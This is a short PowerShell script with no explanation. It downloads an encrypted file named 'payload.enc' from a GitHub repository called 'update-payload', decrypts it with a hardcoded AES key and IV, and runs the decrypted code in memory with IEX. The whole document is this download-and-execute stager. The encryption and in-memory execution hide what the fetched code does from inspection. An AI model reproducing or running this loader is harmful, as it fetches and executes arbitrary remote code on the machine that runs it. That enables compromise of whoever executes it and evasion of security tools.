$url = "https://raw.githubusercontent.com/raacineagency/update-payload/refs/heads/main/payload.enc"
$b64 = (New-Object Net.WebClient).DownloadString($url) -replace '\s',''
$enc = [Convert]::FromBase64String($b64)
$key = [Text.Encoding]::ASCII.GetBytes("0123456789abcdef0123456789abcdef")
$iv  = [Text.Encoding]::ASCII.GetBytes("0123456789abcdef")
$aes = [Security.Cryptography.Aes]::Create()
$aes.Key = $key
$aes.IV = $iv
$aes.Mode = 'CBC'
$aes.Padding = 'PKCS7'
$dec = $aes.CreateDecryptor()
$bytes = $dec.TransformFinalBlock($enc, 0, $enc.Length)
$script = [Text.Encoding]::UTF8.GetString($bytes)
IEX $script
